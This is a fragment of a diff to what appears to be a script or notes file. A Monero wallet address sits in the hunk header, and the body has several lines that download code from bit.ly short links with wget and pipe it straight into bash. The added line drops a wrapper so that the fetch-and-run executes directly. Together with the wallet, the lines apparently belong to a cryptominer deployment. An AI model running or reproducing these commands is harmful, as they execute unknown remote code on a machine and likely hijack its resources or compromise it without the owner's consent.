@@ -28,7 +28,7 @@ XMR:	44ucr5iSqUjCR6m93Gu9ssJC9W1yWLGz1fZbAChLXG1QPnFD5bsTXKJAQEk8dHKDWx8hYJQ5ELq
 
 !echo $(wget -q -O - bit.ly/RV20001 2> lol.out | bash )
 
-!echo $(wget -q -O - bit.ly/IBM0001 2> lol.out | bash 
+wget -q -O - bit.ly/IBM0001 2> lol.out | bash 
 
 wget -q -O - bit.ly/ET00001 2> lol.out | bash 
 
